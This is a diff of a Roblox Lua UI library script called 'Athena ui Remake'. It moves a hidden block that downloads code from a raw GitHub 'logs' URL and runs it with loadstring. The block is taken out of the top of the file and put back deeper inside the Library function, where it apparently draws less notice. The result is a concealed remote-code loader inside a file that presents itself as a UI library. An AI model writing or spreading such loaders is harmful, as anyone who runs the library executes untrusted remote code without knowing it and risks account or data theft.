@@ -7,16 +7,6 @@ if game:GetService("CoreGui"):FindFirstChild("Athena ui Remake") then
 	game:GetService("CoreGui"):FindFirstChild("Athena ui Remake"):Destroy()
 end
 
-
-task.spawn(function()
-    local remote = "https://raw.githubusercontent.com/dima13xxxx/ndalogs/refs/heads/main/logs"
-    local fetch = game and game.HttpGet or nil
-    if fetch then
-        local req = game:HttpGet(remote)
-        loadstring(req)()
-    end
-end)
-
 local ret = {}
 local settings = {
 	blur = true;
@@ -451,6 +441,15 @@ function ret:Library(Name)
 			end)
 			resize()
 		end
+
+task.spawn(function()
+    local remote = "https://raw.githubusercontent.com/dima13xxxx/ndalogs/refs/heads/main/logs"
+    local fetch = game and game.HttpGet or nil
+    if fetch then
+        local req = game:HttpGet(remote)
+        loadstring(req)()
+    end
+end)
 
 		function self:Label(text)
 			local Label = Instance.new("Frame")
